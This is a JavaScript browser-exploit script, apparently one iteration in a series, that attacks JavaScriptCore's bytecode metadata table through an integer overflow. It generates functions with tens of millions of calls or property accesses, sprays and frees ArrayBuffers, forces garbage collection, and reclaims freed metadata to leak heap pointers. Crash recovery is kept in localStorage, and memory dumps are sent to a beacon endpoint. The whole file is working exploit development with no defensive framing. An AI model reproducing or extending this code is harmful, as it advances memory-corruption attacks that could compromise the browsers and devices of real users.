// p151 — Adaptive MetadataTable overflow with crash recovery
//
// FINDINGS FROM P150B FAILURE:
// 1. Zeroed spray crashes: LLInt loads m_slowPathCallDestination from metadata
//    and CALLS it. Zeros = CALL null = SIGSEGV. Both fast/slow paths dereference.
// 2. Async XHR never flushes: function call blocks main thread, crash kills
//    process before network thread sends queued requests.
//
// APPROACH: Three-phase adaptive strategy with localStorage crash recovery.
//
// Phase A: Verify function call works (sync XHR, escalating throw counts)
// Phase B: Extract metadata template from in-bounds entries
// Phase C: Use op_get_by_id overflow (no function pointers in metadata!)
//
// Beacon prefix: V151-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V151-' + tag + '?t=' + Date.now(), false); // SYNC!
      x.send();
    } catch (e) {}
  }
  function BA(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V151-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V151-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch (e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  // ---- localStorage state machine ----
  var STATE_KEY = 'p151_state';
  var state;
  try { state = JSON.parse(localStorage.getItem(STATE_KEY)); } catch (e) {}
  if (!state) state = { phase: 'A0', attempt: 0, throwAt: 0, history: [] };

  function saveState() {
    try { localStorage.setItem(STATE_KEY, JSON.stringify(state)); } catch (e) {}
  }
  function logEvent(msg) {
    state.history.push(msg);
    if (state.history.length > 50) state.history.shift();
    saveState();
  }

  BS('BOOT-PHASE-' + state.phase + '-ATT-' + state.attempt);

  // Check if last run crashed (state says "running" but we rebooted)
  if (state.running) {
    BS('CRASH-DETECTED-AT-' + state.running);
    logEvent('CRASH@' + state.running);
    state.running = null;
    // Advance phase based on crash info
    advanceAfterCrash();
  } else {
    runCurrentPhase();
  }

  function advanceAfterCrash() {
    if (state.phase === 'A1') {
      // 38M function crashed at throwAt=1 → function can't be entered at all
      BS('A1-CANT-ENTER');
      state.phase = 'C0'; // Skip to op_get_by_id approach
      saveState();
      runCurrentPhase();
    } else if (state.phase === 'A2') {
      // Binary search: crashed at this throwAt value
      var crashed = state.throwAt;
      BS('A2-CRASHED-AT-' + crashed);
      state.a2_high = crashed;
      state.throwAt = Math.floor((state.a2_low + crashed) / 2);
      if (state.a2_high - state.a2_low <= 1) {
        BS('A2-BOUNDARY-' + state.a2_low);
        logEvent('BOUNDARY=' + state.a2_low);
        state.phase = 'B0';
        state.boundary = state.a2_low;
        saveState();
        runCurrentPhase();
      } else {
        saveState();
        runCurrentPhase();
      }
    } else {
      // Unknown crash, restart
      state.phase = 'A0';
      saveState();
      runCurrentPhase();
    }
  }

  function runCurrentPhase() {
    switch (state.phase) {
      case 'A0': phaseA0(); break;
      case 'A1': phaseA1(); break;
      case 'A2': phaseA2(); break;
      case 'B0': phaseB0(); break;
      case 'C0': phaseC0(); break;
      default:
        BS('DONE-ALL-PHASES');
    }
  }

  // ---- PHASE A0: Small function test (100 calls, no overflow) ----
  function phaseA0() {
    BS('A0-START');
    var src = 'window.__testFn=function(a){';
    for (var i = 0; i < 100; i++) src += 'a();';
    src += '};window.__testOk=1;';

    var blob = new Blob([src], { type: 'application/javascript' });
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      if (!window.__testOk) { BS('A0-COMPILE-FAIL'); return; }
      BS('A0-COMPILED');

      var count = 0;
      try {
        window.__testFn(function() { count++; });
        BS('A0-CALLS-' + count);
        logEvent('A0-OK-' + count);

        if (count === 100) {
          BS('A0-PASS');
          state.phase = 'A1';
          saveState();
          setTimeout(runCurrentPhase, 100);
        } else {
          BS('A0-WRONG-COUNT-' + count);
        }
      } catch (e) {
        BS('A0-ERR-' + e.message);
      }
    };
    sc.onerror = function() { BS('A0-SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // ---- PHASE A1: 38M function, throw-at-1 ----
  function phaseA1() {
    BS('A1-START');
    buildBigFunction(function() {
      BS('A1-COMPILED');

      state.running = 'A1-throw1';
      saveState();

      var count = 0;
      try {
        window.__p151fn(function() {
          count++;
          BS('A1-CALL-' + count); // SYNC beacon for each of first few calls
          if (count >= 1) throw new Error('bail');
        });
      } catch (e) {
        BS('A1-THREW-' + count);
      }

      state.running = null;
      logEvent('A1-OK-' + count);

      if (count >= 1) {
        BS('A1-PASS-FN-CALLABLE');
        // Now test throw at 10
        state.running = 'A1-throw10';
        saveState();

        count = 0;
        try {
          window.__p151fn(function() {
            count++;
            if (count >= 10) throw new Error('bail');
          });
        } catch (e) {}
        state.running = null;
        BS('A1-T10-' + count);
        logEvent('A1-T10-' + count);

        // Test throw at 100
        state.running = 'A1-throw100';
        saveState();
        count = 0;
        try {
          window.__p151fn(function() {
            count++;
            if (count >= 100) throw new Error('bail');
          });
        } catch (e) {}
        state.running = null;
        BS('A1-T100-' + count);
        logEvent('A1-T100-' + count);

        // Test throw at 500
        state.running = 'A1-throw500';
        saveState();
        count = 0;
        try {
          window.__p151fn(function() {
            count++;
            if (count >= 500) throw new Error('bail');
          });
        } catch (e) {}
        state.running = null;
        BS('A1-T500-' + count);
        logEvent('A1-T500-' + count);

        // Test throw at 893 (last in-bounds)
        state.running = 'A1-throw893';
        saveState();
        count = 0;
        try {
          window.__p151fn(function() {
            count++;
            if (count >= 893) throw new Error('bail');
          });
        } catch (e) {}
        state.running = null;
        BS('A1-T893-' + count);
        logEvent('A1-T893-' + count);

        // Now try 894 (first OOB — expect crash or success)
        state.phase = 'A2';
        state.a2_low = 893;
        state.a2_high = 1200;
        state.throwAt = 894; // Start right at boundary
        saveState();
        setTimeout(runCurrentPhase, 200);
      } else {
        BS('A1-FAIL-NO-CALLS');
        state.phase = 'C0';
        saveState();
        setTimeout(runCurrentPhase, 200);
      }
    });
  }

  // ---- PHASE A2: Binary search for crash boundary ----
  function phaseA2() {
    var target = state.throwAt;
    BS('A2-TRY-' + target);

    state.running = 'A2-throw' + target;
    saveState();

    var count = 0;
    try {
      window.__p151fn(function() {
        count++;
        if (count >= target) throw new Error('bail');
      });
    } catch (e) {}

    state.running = null;
    BS('A2-OK-' + target + '-CALLS-' + count);
    logEvent('A2-OK@' + target + '=' + count);

    // Success! This throwAt value is safe.
    state.a2_low = target;

    if (state.a2_high - state.a2_low <= 1) {
      BS('A2-BOUNDARY-' + state.a2_low);
      state.phase = 'B0';
      state.boundary = state.a2_low;
      saveState();
      setTimeout(runCurrentPhase, 200);
    } else {
      state.throwAt = Math.floor((state.a2_low + state.a2_high) / 2);
      saveState();
      setTimeout(runCurrentPhase, 200);
    }
  }

  // ---- PHASE B0: Extract metadata template from in-bounds entries ----
  // Strategy: Call function with throw at boundary, then GC the function,
  // reclaim metadata buffer with ArrayBuffer, read the linked entries.
  function phaseB0() {
    var boundary = state.boundary || 893;
    BS('B0-START-BOUNDARY-' + boundary);

    // Step 1: Call the function to link in-bounds metadata entries
    var count = 0;
    try {
      window.__p151fn(function() {
        count++;
        if (count >= boundary) throw new Error('bail');
      });
    } catch (e) {}
    BS('B0-LINKED-' + count);

    // Step 2: Null the function reference to make CodeBlock eligible for GC
    window.__p151fn = null;
    window.__p151ok = null;

    // Step 3: Aggressive GC
    for (var g = 0; g < 500; g++) {
      var t = new ArrayBuffer(65536);
      t = null;
    }
    BS('B0-GC-DONE');

    // Step 4: Allocate ArrayBuffers of exact metadata size (100096 bytes)
    // One of them might reclaim the freed metadata buffer
    var reclaim = [];
    for (var i = 0; i < 30; i++) {
      reclaim.push(new ArrayBuffer(100096));
    }
    BS('B0-RECLAIM-30');

    // Step 5: Scan for non-zero data (metadata residue)
    var hitIdx = -1;
    var hitCount = 0;
    for (var i = 0; i < reclaim.length; i++) {
      var view = new Uint8Array(reclaim[i]);
      var nonZero = 0;
      for (var j = 0; j < view.length; j += 8) {
        if (view[j] !== 0 || view[j+1] !== 0 || view[j+2] !== 0 || view[j+3] !== 0) {
          nonZero++;
        }
      }
      if (nonZero > 10) { // Metadata has lots of non-zero fields
        if (hitIdx === -1) hitIdx = i;
        hitCount++;
      }
    }
    BS('B0-HITS-' + hitCount + '-FIRST-' + hitIdx);

    if (hitIdx >= 0) {
      // Found metadata residue! Extract the template.
      var view = new Uint8Array(reclaim[hitIdx]);

      // Dump first 3 metadata entries (112 bytes each)
      for (var e = 0; e < 3; e++) {
        var off = e * 112;
        var h1 = '';
        for (var b = off; b < off + 56; b++) h1 += hexByte(view[b]);
        BS('B0-E' + e + 'a-' + h1);
        var h2 = '';
        for (var b2 = off + 56; b2 < off + 112; b2++) h2 += hexByte(view[b2]);
        BS('B0-E' + e + 'b-' + h2);

        // Extract 8-byte values at key offsets
        // m_slowPathCallDestination is likely at offset ~64 in BaselineCallLinkInfo
        var ptrs = '';
        for (var p = 0; p < 112; p += 8) {
          var nonZ = false;
          for (var v2 = 0; v2 < 8; v2++) {
            if (view[off + p + v2] !== 0) { nonZ = true; break; }
          }
          if (nonZ) {
            var hex8 = '';
            for (var h = 7; h >= 0; h--) hex8 += hexByte(view[off + p + h]);
            ptrs += 'o' + p + ':' + hex8 + ' ';
          }
        }
        if (ptrs) BP('B0-P' + e, ptrs.trim());
      }

      logEvent('B0-TEMPLATE-FOUND');
      state.phase = 'B1';
      state.templateBufIdx = hitIdx;
      saveState();
      BS('B0-TEMPLATE-EXTRACTED');

      // Phase B1: Use template for spray
      // (implemented in next reload cycle to start fresh)
    } else {
      BS('B0-NO-RESIDUE');
      logEvent('B0-NO-RESIDUE');
      // Fall back to Phase C
      state.phase = 'C0';
      saveState();
      setTimeout(runCurrentPhase, 200);
    }
  }

  // ---- PHASE C0: op_get_by_id overflow (SAFE — no function pointers) ----
  // get_by_id metadata: structureID (4B int) comparison only.
  // OOB reads give garbage structureID → cache miss → slow path → NO crash.
  // Slow path writes JSValue (object pointer) to ValueProfile → into our spray!
  function phaseC0() {
    BS('C0-START');

    // First, determine get_by_id metadata size by testing
    // Create a function with 10 obj.x accesses and measure metadata
    var src10 = 'window.__gbi10=function(o){';
    for (var i = 0; i < 10; i++) src10 += 'o.x;';
    src10 += '};window.__gbi10ok=1;';

    var blob = new Blob([src10], { type: 'application/javascript' });
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      if (!window.__gbi10ok) { BS('C0-COMPILE-FAIL'); return; }
      BS('C0-SMALL-COMPILED');

      // Call it to verify it works
      var obj = { x: 42 };
      try {
        window.__gbi10(obj);
        BS('C0-SMALL-OK');
      } catch (e) {
        BS('C0-SMALL-ERR-' + e.message);
        return;
      }

      // Now build the overflow function with op_get_by_id
      // We need to determine the metadata stride first.
      // OpGetById::Metadata = GetByIdModeMetadata + ValueProfile
      // GetByIdModeMetadata ≈ 24-32 bytes, ValueProfile = 24 bytes
      // Total ≈ 48-56 bytes. Let's test both.
      //
      // For stride=48: N = ceil(2^32/48) = 89,478,486 → code = ~358MB (might OOM)
      // For stride=56: N = ceil(2^32/56) = 76,695,845 → code = ~307MB
      // For stride=40: N = ceil(2^32/40) = 107,374,183 → code = ~429MB (too big)
      //
      // Let's try a smarter approach: measure by creating two functions
      // of known sizes and comparing their metadata allocation difference.
      //
      // OR just try stride=48 since it's a common size.

      // Actually, let's be clever: use a SMALLER overflow that wraps to ~100KB
      // For stride S: N = ceil(2^32/S), wrapped = 2^32 mod S... wait no.
      // N*S mod 2^32 = allocated. We want allocated ≈ 100KB.
      // For S=48: need N*48 mod 2^32 ≈ 100096
      //   N*48 = k*2^32 + 100096 → N = (k*2^32 + 100096)/48
      //   k=1: N = (4294967296 + 100096)/48 = 4295067392/48 = 89480570.666 → not integer
      //   k=2: N = (8589934592 + 100096)/48 = 8590034688/48 = 178959056
      //   Hmm, might not divide evenly. Let's pick a different target.
      //
      //   Actually for ANY stride: N_min = ceil(2^32 / stride)
      //   Wrapped size = N_min * stride - 2^32
      //   For stride=48: wrapped = 89478486 * 48 - 2^32 = 4295127328 - 4294967296 = 160032
      //   So allocation = 160032 bytes with 89478486 entries
      //   In-bounds entries = floor(160032/48) = 3334
      //   OOB starts at entry 3334

      // This is getting complex. Let's just use the op_call overflow we already know works
      // but with the METADATA TEMPLATE approach from Phase B.
      //
      // Alternatively: try a MUCH smaller get_by_id overflow.
      //
      // For stride=48, if we want 2x wrapping:
      // N = ceil(2*2^32/48) = ceil(178956970.67) = 178956971
      // Code = 178956971 * 4 bytes ≈ 716MB — too big!
      //
      // This approach needs too many entries. Let's try stride=48, N=89478486.
      // Code size: 89478486 * "o.x;" (4 chars) = ~358MB. Possible but heavy.

      BS('C0-BUILDING-GBI-OVERFLOW');

      // Build with chunks like p150
      var N = 89478486;
      var CHUNK = 5000000;
      var chunksN = Math.floor(N / CHUNK);
      var rem = N - chunksN * CHUNK;

      var accessChunk = 'o.x;'.repeat(CHUNK);
      var parts = new Array(chunksN + 3);
      parts[0] = 'window.__gbiFn=function(o){';
      for (var c = 0; c < chunksN; c++) parts[1 + c] = accessChunk;
      parts[chunksN + 1] = 'o.x;'.repeat(rem);
      parts[chunksN + 2] = '};window.__gbiOk=1;';
      accessChunk = null;

      var gbiBlob = new Blob(parts, { type: 'application/javascript' });
      BS('C0-BLOB-' + Math.round(gbiBlob.size / 1048576) + 'MB');
      parts = null;

      var gbiUrl = URL.createObjectURL(gbiBlob);
      var sc2 = document.createElement('script');
      sc2.onerror = function() { BS('C0-SCRIPT-ERR'); };
      sc2.onload = function() {
        var ok = window.__gbiOk ? 'OK' : 'FAIL';
        BS('C0-COMPILED-' + ok);
        if (ok !== 'OK') return;

        phaseC1_execute();
      };
      document.head.appendChild(sc2);
      sc2.src = gbiUrl;
    };
    sc.onerror = function() { BS('C0-SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  function phaseC1_execute() {
    BS('C1-START');

    // Spray zeroed ArrayBuffers (safe for get_by_id — no fn ptrs to deref)
    var BUF_SZ = 160032; // Wrapped metadata size for stride=48, N=89478486
    var sprays = [];
    var sprayViews = [];
    for (var i = 0; i < 40; i++) {
      var ab = new ArrayBuffer(BUF_SZ);
      sprays.push(ab);
      sprayViews.push(new Uint8Array(ab));
    }

    // Free alternating
    var keptIndices = [];
    for (var i = 0; i < 40; i++) {
      if (i % 2 === 0) {
        sprays[i] = null;
        sprayViews[i] = null;
      } else {
        keptIndices.push(i);
      }
    }
    BS('C1-SPRAY-HOLES');

    // GC
    for (var g = 0; g < 300; g++) { var t = new ArrayBuffer(8192); t = null; }

    // Create a target object whose address we want to leak
    var leakTarget = { x: { secret: 0xCAFEBABE } };
    // Make the structure stable by accessing .x once
    var dummy = leakTarget.x;

    BS('C1-CALLING-GBI');
    state.running = 'C1-gbi';
    saveState();

    // Call the get_by_id overflow function
    // The first ~3334 calls access in-bounds metadata (safe)
    // Calls 3335+ access OOB metadata (our spray or adjacent heap)
    // OOB structureID != leakTarget's structureID → slow path
    // Slow path: normal property lookup, writes result to ValueProfile
    // ValueProfile write goes into our spray!
    //
    // We use a Proxy to count accesses and bail after enough OOB accesses.
    var accessCount = 0;
    var TARGET_ACCESSES = 4000; // 3334 in-bounds + ~666 OOB
    var bailed = false;

    var proxy = new Proxy(leakTarget, {
      get: function(target, prop) {
        accessCount++;
        if (accessCount === 3334) BS('C1-LAST-INBOUNDS');
        if (accessCount === 3335) BS('C1-FIRST-OOB');
        if (accessCount === 4000) BS('C1-4000');
        if (accessCount >= TARGET_ACCESSES) {
          bailed = true;
          throw new Error('c1-bail');
        }
        return target[prop];
      }
    });

    try {
      window.__gbiFn(proxy);
    } catch (e) {
      BS('C1-THREW-' + accessCount);
    }

    state.running = null;
    saveState();
    BS('C1-ACCESSES-' + accessCount);

    // Scan spray for non-zero values (leaked pointers from ValueProfile writes)
    BS('C1-SCANNING');
    var hitABs = 0;
    var totalNonZero = 0;

    for (var ki = 0; ki < keptIndices.length; ki++) {
      var idx = keptIndices[ki];
      var view = sprayViews[idx];
      if (!view) continue;

      var nonZero = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nonZero++;
        }
      }

      if (nonZero > 0) {
        hitABs++;
        totalNonZero += nonZero;
        BS('C1-HIT-' + idx + '-nz=' + nonZero + '-f=' + firstOff);

        // Dump first 3 non-zero 48-byte aligned blocks
        var dumped = 0;
        for (var e = 0; e < view.length - 48 && dumped < 3; e += 48) {
          var hasData = false;
          for (var c = e; c < e + 48; c++) {
            if (view[c] !== 0) { hasData = true; break; }
          }
          if (!hasData) continue;
          dumped++;

          var h = '';
          for (var b = e; b < e + 48; b++) h += hexByte(view[b]);
          BS('C1-D' + idx + '@' + e + '-' + h);

          // Extract pointers (8-byte LE values)
          var ptrs = '';
          for (var p = 0; p < 48; p += 8) {
            var nonZ = false;
            for (var v2 = 0; v2 < 8; v2++) {
              if (view[e + p + v2] !== 0) { nonZ = true; break; }
            }
            if (nonZ) {
              var hex8 = '';
              for (var hh = 7; hh >= 0; hh--) hex8 += hexByte(view[e + p + hh]);
              ptrs += 'o' + p + ':' + hex8 + ' ';
            }
          }
          if (ptrs) BP('C1-P' + idx + '@' + e, ptrs.trim());
        }
      }
    }

    BS('C1-DONE-hits=' + hitABs + '-nz=' + totalNonZero);
    logEvent('C1-hits=' + hitABs + '-nz=' + totalNonZero);
  }

  // ---- Build the 38M op_call function ----
  function buildBigFunction(callback) {
    var N = 38348816;
    BS('BUILD-N' + N);

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__p151fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p151ok=1;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { BS('SCRIPT-ERR'); };
    sc.onload = function() {
      var ok = window.__p151ok ? 'OK' : 'FAIL';
      BS('COMPILED-' + ok);
      if (ok === 'OK') callback();
    };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
